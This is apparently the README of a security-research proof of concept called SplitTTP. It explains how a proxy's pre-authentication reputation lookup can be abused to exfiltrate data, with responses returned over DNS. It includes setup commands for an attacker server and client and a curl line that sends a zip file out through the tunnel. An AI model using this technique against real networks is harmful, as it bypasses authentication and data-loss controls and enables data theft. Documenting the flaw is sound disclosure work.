# SplitTTP – Turning an HTTP Proxy’s Reputation Look-Up into an exfil sidechannel

*Proof-of-Concept for Security Researchers*

**Goal:** To demonstrate how a commercial proxy’s URL-reputation engine, invoked _before_ authentication, can be hijacked for exfiltration. We also implement DNS for fetching the result if bidirectional communication is needed.

---

## Why Build Yet-Another Exfil PoC?

We demonstrate the evasion of the authentication control on the Proxy to exfiltrate data through a reputation check sidechannel.
SplitTTP also pulls the **server’s response** back in via DNS, proving a full round trip.
That exposes the risk of “reputation-first, auth-later” designs present in several enterprise products.

> **DNS is simply a convenient return path.**
> An all-DNS approach is feasible, but HTTP exfil is faster and we want to demonstrate the reputation side-channel.

---

## Architecture



```text
+--------------------------------------------------------------------------------------------------------------+                                                                                
|                                                                                          ENTERPRISE NETWORK  |                                                                                
|                                                                                                              |                                                                                
|                   +------------------------------------------------+                                         |                                                                                
|                   |                                      ATTACKER  |                                         |                               INTERNET                                                 
|                   |                                                |                                         |                                                                                
|                   |                                                |                                         |                                                                                
|                   |               +--------------------+           |                                         |                                                                                
|                   |               |                    |           |                                         |                                                                                
|                   |               |                    |           |                                         |                                                                                
|                   |               |    CLIENT          |           |                                         |                                                                                
|                   |               |                    |           |                                         |                                                                                
|                   |               |    e.g. CURL       |           |                                         |                                                                                
|                   |               |                    |           |                                         |                                                                                
|                   |               |                    |           |                                         |                                                                                
|                   |               |                    |           |                                         |                                                                                
|                   |               +---------^----------+           |                                         |                                                +------------------------------+
|                   |                     *S1 | *S7                  |                                         |                                                |                              |
|                   |                         |                      |                                         |                                                |                              |
|                   |               +---------v----------+           |                                         |                                                |                              |
|                   |               |                    |           |                                         |                                                |    DESTINATION HTTP SERVER   |
|                   |               |  SPLITTTP CLIENT   |           |                                         |                                                |                              |
|                   |     +-------->|                    |           |                                         |                                                |                              |
|                   |     |         |  (PROXY SERVER)    |           |                                         |                                                |                              |
|                   |     |         |  (DNS CLIENT)      |           |                                         |                                                |                              |
|                   |     |         |                    +-----+     |                                         |                                                |                              |
|                   |     |         +-----+----+----+----+     |     |                                         |                                                |                              |
|                   |     |               |    |    |          |     |                                         |                                                +---------------^--------------+
|                   |     |               |    |    |          |     |                                         |                                                                |               
|                   |     |               |    |    |          |     |                                         |                                                                |               
|                   +-----|---------------+----+----+----------+-----+                                         |                                                                |   *S6         
|                         |               |    |    |          |                                               |                                                                |               
|                         |               |    |    |          |                                               |                                                                |               
|         *S4             |               |    |    |  *S2     |                                               |                                                +---------------v--------------+
|    HTTP-PROXY AUTH REQ  |               |    |    |          |                                               |                                                |                              |
|                         |               |    |    |          |                                               |                                                |      SPLITTTP SERVER         |
|                         |               |    |    |          |                                               |                                                |                              |
|                         |               |    |    |          |                                               |    +---------------------------------+         +-----------+      +-----------+
|                         |         +-----v----v----v----+     |                      *S3                      |    |                                 |   *S5   |           |      |           |
|                         |         |                    +-----+-----------------------------------------------+---->                                 +--------->           |      |           |
|                         |         |                    |     |                                               |    |     REPUTATION SERVICE          |         |  HTTP SRV |      |   DNS SRV |
|                         |         |  ENTERPRISE HTTP   +-----+-----------------------------------------------+---->                                 +--------->           |      |           |
|                         +---------+       PROXY        |     |                                               |    |                                 |         |           |      |           |
|                                   |                    +-----+-----------------------------------------------+---->                                 +--------->           |      |           |
|                                   |                    |     |                                               |    +---------------------------------+         +-----------+      +-------^---+
|                                   +--------------------+     |                                               |                                                |                          |   |
|                                                              |                                               |                                                |                          |   |
|                                   +--------------------+     |                                               |                                                |                          |   |
|                                   |                    |     |                                               |                                                |                          |   |
|                                   |                    |     |                                               |                                                +--------------------------+---+
|                                   |                    |     |                                               |                                                                           |    
|                                   |  ENTERPRISE DNS    |     |                                               |                                                                           |    
|                                   |                    |<----+                                               |                                                                           |    
|                                   |                    +-----------------------------------------------------+---------------------------------------------------------------------------+    
|                                   +--------------------+                                                     |                                                                                
|                                                                                                              |                                                                                
|                                                                                                              |                                                                                
|                                                                                                              |                                                                                
|                                                                                                              |                                                                                
+--------------------------------------------------------------------------------------------------------------+                                                                                
```
### Flow Explained

Let's consider the following scenario:

- An attacker has gained access to a network but the only way out to the internet is through an HTTP proxy (e.g., "GreenVest Proxy").
- The attacker has no credentials for the proxy.
- The proxy has a URL reputation service turned on (often default).
- The proxy sends the requested URL to its reputation service *before* checking authentication.
- (If bidirectional comms are needed) The attacker also has DNS resolution capabilities through the corporate DNS server.
- All other outbound ports are blocked by a firewall.


#### Steps

1.  **Application request (S1)**
    The attacker uses an application like `curl` to make a request, configured to use the `splittp_client.py` as its HTTP proxy. Example:
    `curl -x http://SPLITTTP_CLIENT_IP:LISTEN_PORT -d @data.zip http://DESTINATIONSERVER/receivedata`

2.  **Outbound request via Reputation Channel (S2, S3)**
    `splittp_client.py` receives the request. It base64-encodes the original HTTP request (method, headers, URL, data), slices it into URL-safe chunks, and constructs URLs like:
    `http://SPLITTTP_SERVER_IP:PORT/receive/<id>/<idx>/<totalchunks>/<chunkdata>`
    These URLs are sent as requests through the **Enterprise HTTP Proxy (S4)**. The enterprise proxy, performing a reputation lookup on these crafted URLs, forwards them to the `splittp_server.py` (which acts as the "reputation service" in this context) **even if the user never authenticates with the enterprise proxy**.

3.  **Real fetch and Response Pickling (S5, S6)**
    `splittp_server.py` (the Flask application) receives the chunks, reassembles the original request, and forwards it to the actual **Destination HTTP Server**. It then receives the response, pickles the entire `requests.Response` object, and saves it to a file named after the `<id>` in a designated directory (e.g., `/tmp/dns_files/<id>`).

4.  **DNS Return Path (S7)**
    `splittp_client.py` (via its internal `dnsclient.py` module) now needs to retrieve the response. It performs a `CNAME` query to `dns_server.py` (e.g., `<id>.your.domain`) to learn the total number of chunks for the pickled response. It then issues sequential `TXT` queries (e.g., `0.<id>.your.domain`, `1.<id>.your.domain`, …) to retrieve each base32-encoded slice of the pickled `requests.Response` from `dns_server.py`.

5.  **Response Reconstruction (S7 continued)**
    Back inside the enterprise network, `splittp_client.py` receives the base32-encoded chunks from `dnsclient.py`, decodes them, and unpickles the bytes to reconstruct the complete `requests.Response` object. This response (content, status, headers) is then delivered to the original application (e.g., `curl`).

---

## Component Overview

All components are configurable via command-line arguments. Use `-h` or `--help` with each script for details.

| File                | Role                                                                                                                                                                                                                                                           | Key Configuration                                                                 |
|---------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| `splittp_client.py` | An HTTP proxy server. Receives requests from applications, chunks and sends them to `splittp_server.py` via the enterprise proxy. Retrieves responses using its internal `dnsclient.py`.                                                                         | `-s <server_url>`, `-p <listen_port>`, `--listen-host <ip>`, DNS settings (`--dns-domain`, etc.) |
| `splittp_server.py` | A Flask HTTP server (run on an internet-accessible machine). Reassembles chunked data, fetches content from the destination server, pickles the `requests.Response`, and saves it for the `dns_server.py`.                                                      | `-port <listen_port>`, SSL options                                                |
| `dns_server.py`     | A DNS server (run on an internet-accessible machine, typically alongside `splittp_server.py`). Serves the pickled `requests.Response` objects (which are stored by `splittp_server.py`) in base32-encoded chunks via `CNAME` and `TXT` records. Saves files to `/tmp/dns_files/`. | `-d <base_domain>`, `-p <listen_port>`, `--tcp`, `--udp`                            |
| `dnsclient.py`      | A module used internally by `splittp_client.py`. It handles querying `dns_server.py` for `CNAME` (chunk count) and `TXT` (chunk payload) records, decodes the base32 data, and unpickles the `requests.Response` object.                                   | Configured by `splittp_client.py`                                                 |

---

## When DNS Is *Not* Required

If you only need one-way exfiltration (sending data out but not receiving a response back to the original client):

* The DNS components (`dns_server.py` and the DNS-related logic in `splittp_client.py`/`dnsclient.py`) are not strictly necessary.
* `splittp_server.py` could be modified to discard the response from the destination server or POST it to an attacker-controlled endpoint elsewhere, instead of pickling it for DNS retrieval.

DNS remains in this PoC to **prove a complete round trip** and demonstrate bidirectional data transfer.

---

## Quick Lab Setup

```bash
# 0. Install dependencies
pip install aiohttp flask dnslib dnspython requests

# 1. On an Internet-reachable VPS (e.g., VPS_IP = your server's public IP)

# Start the SplitTTP Server (Flask App)
# Listens for chunked requests from the enterprise proxy
# Fetches from destination, pickles response, saves to /tmp/dns_files/
python3 splittp_server.py -port 5000 &

# Start the DNS Server
# Serves pickled responses from /tmp/dns_files/ via DNS
# Default base domain is 'my.files', default port 5354 (UDP & TCP)
python3 dns_server.py -d my.files -p 5354 --udp --tcp &
# (Note: --udp and --tcp are enabled by default if not specified)


# 2. Inside the proxy-controlled network (Attacker's machine)

# Start the SplitTTP Client (aiohttp Proxy & DNS Client)
# Listens for application requests (e.g., from curl)
# Sends data to splittp_server via enterprise proxy
# Retrieves response via dns_server
python3 splittp_client.py \
    -s http://VPS_IP:5000 \
    -p 8999 \
    --listen-host 0.0.0.0 \
    --dns-server-ip VPS_IP \
    --dns-server-port 5354 \
    --dns-domain my.files \
    --outbound-proxy http://ENTERPRISE_PROXY_IP:ENTERPRISE_PROXY_PORT
    # Example: --outbound-proxy [http://127.0.0.1:8443](http://127.0.0.1:8443) (if GreenVest is local)

# 3. Configure your application (e.g., curl, browser) on the attacker's machine
#    to use the SplitTTP Client as its HTTP proxy:
#    Proxy: http://localhost:8999 (if splittp_client.py is running locally)
# Example:
curl -x http://localhost:8999 -d "testdata" http://example.org/receivedata.php
```

---

## Security Insights

* **Authentication sequencing matters** – A premature reputation lookup can open a tunnel that bypasses authentication, authorization, SSL inspection, DLP, etc.

---
## Limitations & Ethics

* This is Proof-of-Concept grade code. It uses raw `pickle` (which has security implications if the data source is untrusted, though here the pickled data originates from a `requests.Response` object controlled by `splittp_server.py`). It does not perform cleanup of files in `/tmp/dns_files/`.
* Lacks advanced stealth features (e.g., jitter, padding, encryption of the covert channel data).
* **Ethical Use Only:** This tool is intended for security research, education, and authorized penetration testing. Use only where you have explicit, written permission. Misuse of this tool is illegal and unethical.


